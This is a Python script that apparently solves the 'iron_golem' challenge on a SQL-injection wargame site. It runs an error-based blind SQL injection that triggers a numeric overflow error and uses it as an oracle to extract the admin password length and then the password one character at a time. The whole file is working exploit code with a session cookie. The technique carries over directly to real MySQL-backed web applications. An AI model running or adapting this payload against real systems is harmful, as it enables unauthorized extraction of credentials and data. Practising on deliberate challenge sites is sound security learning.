import requests, string

cookies = {"PHPSESSID": "93l88lha32uc2t2q2c3n1v37p7"}

url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"

error_text = "DOUBLE value is out of range"

password_length = 32

for l in range(1,100):
  payload = "' or id='admin' and if(length(pw)={length},9e307*2,0)#".format(length=l)
  params = {"pw": payload}
  r = requests.get(url, params=params, cookies=cookies)
  if error_text in r.text:
    password_length = l
    print("Password length is %s" % (password_length))
    break

password = ""

for l in range(1,password_length+1):
  for c in string.printable:
    payload = "' or id='admin' and if(ascii(substring(pw,{offset},1))={character},9e307*2,0)#".format(offset=l, character=ord(c))
    params = {"pw": payload}
    r = requests.get(url, params=params, cookies=cookies)
    if error_text in r.text:
      password += c
      print(password)
      break